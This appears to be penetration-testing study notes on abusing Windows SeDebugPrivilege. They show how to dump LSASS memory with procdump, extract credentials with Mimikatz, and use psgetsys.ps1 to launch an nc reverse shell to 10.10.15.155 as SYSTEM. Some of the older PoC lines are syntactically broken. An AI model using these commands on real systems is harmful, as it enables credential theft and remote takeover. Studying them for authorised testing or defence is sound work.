To run a particular application or service or assist with troubleshooting, a user might be assigned the [SeDebugPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs) instead of adding the account into the administrators group. This privilege can be assigned via local or domain group policy, under `Computer Settings > Windows Settings > Security Settings`. By default, only administrators are granted this privilege as it can be used to capture sensitive information from system memory, or access/modify kernel and application structures. This right may be assigned to developers who need to debug new system components as part of their day-to-day job. This user right should be given out sparingly because any account that is assigned it will have access to critical operating system components.

During an internal penetration test, it is often helpful to use websites such as LinkedIn to gather information about potential users to target. Suppose we are, for example, retrieving many NTLMv2 password hashes using `Responder` or `Inveigh`. In that case, we may want to focus our password hash cracking efforts on possible high-value accounts, such as developers who are more likely to have these types of privileges assigned to their accounts. A user may not be a local admin on a host but have rights that we cannot enumerate remotely using a tool such as BloodHound. This would be worth checking in an environment where we obtain credentials for several users and have RDP access to one or more hosts but no additional privileges.

```powershell
Privilege Name                            Description 
========================================= ====================================
SeDebugPrivilege                          Debug programs
```

### Exploitation

#### Dump + Katz
We can use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) from the [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) suite to leverage this privilege and dump process memory. A good candidate is the Local Security Authority Subsystem Service ([LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)) process, which stores user credentials after a user logs on to a system.

```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

This is successful, and we can load this in Mimikatz using the sekurlsa::minidump command. After issuing the sekurlsa::logonPasswords commands, we gain the NTLM hash of the local administrator account logged on locally

```powershell
log
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

Suppose we are unable to load tools on the target for whatever reason but have RDP access. In that case, we can take a manual memory dump of the `LSASS` process via the Task Manager by browsing to the `Details` tab, choosing the `LSASS` process, and selecting `Create dump file`. After downloading this file back to our attack system, we can process it using Mimikatz the same way as the previous example.

![[Pasted image 20250216110053.png]]
#### RCE as SYSTEM (RDP)
We can also leverage `SeDebugPrivilege` for [RCE](https://decoder.cloud/2018/02/02/getting-system/). Using this technique, we can elevate our privileges to SYSTEM by launching a [child process](https://docs.microsoft.com/en-us/windows/win32/procthread/child-processes) and using the elevated rights granted to our account via `SeDebugPrivilege` to alter normal system behavior to inherit the token of a [parent process](https://docs.microsoft.com/en-us/windows/win32/procthread/processes-and-threads) and impersonate it. If we target a parent process running as SYSTEM (specifying the Process ID (or PID) of the target process or running program), then we can elevate our rights quickly

Transfer this PoC script [psgetsys.ps1](https://raw.githubusercontent.com/decoder-it/psgetsystem/refs/heads/master/psgetsys.ps1) over to the target system. 

Open an elevated PowerShell and find a process running as `SYSTEM`
```powershell
PS C:\htb> tasklist 

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        116 K
smss.exe                       340 Services                   0      1,212 K
csrss.exe                      444 Services                   0      4,696 K
wininit.exe                    548 Services                   0      5,240 K
csrss.exe                      556 Console                    1      5,972 K
winlogon.exe                   612 Console                    1     10,408 K
```

We can target winlogon.exe running under PID 612, which we know runs as SYSTEM on Windows hosts.

Run the script with the following syntax
`[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`

```powershell
. .\psgetsys.ps1

ImpersonateFromParentPid -ppid 612 -command "C:\programdata\nc.exe" -cmdargs "10.10.15.155 8443 -e powershell.exe"

ImpersonateFromParentPid -ppid (Get-Process "lsass").Id -command "C:\programdata\nc.exe" -cmdargs "10.10.15.155 8443 -e powershell.exe"
```

Old [PoC script](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) 
```powershell
.\psgetsys.ps1 [MyProcess]::CreateProcessFromParent(612,"C:\Windows\System32\cmd.exe"."")

.\psgetsys.ps1 [MyProcess]::CreateProcessFromParent((Get-Process "lsass").Id,"c:\ProgramData\nc.exe 10.10.15.155 8443 -e cmd.exe"."")
```

Other tools such as [this one](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) exist to pop a SYSTEM shell when we have `SeDebugPrivilege`